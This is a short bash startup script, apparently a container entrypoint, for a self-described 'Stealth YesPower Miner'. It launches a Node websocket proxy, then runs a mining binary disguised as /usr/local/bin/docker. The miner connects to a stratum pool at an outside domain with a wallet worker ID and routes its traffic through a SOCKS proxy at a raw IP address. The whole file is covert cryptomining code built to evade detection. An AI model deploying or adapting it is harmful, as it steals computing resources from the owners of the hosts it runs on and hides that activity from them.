#!/bin/bash
set -e

echo "=== Stealth YesPower Miner Started ==="

node /app/wsproxy.js &
sleep 3

echo "⛏️ Mining started..."

exec /usr/local/bin/docker \
    -a yespower \
    -o stratum+tcp://dagnam.xyz:4629 \
    -u "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker" \
    -p "c=SWAMP,mc=SWAMP" \
    -t 2 \
    --proxy 45.115.224.103:1080 \
    "$@"
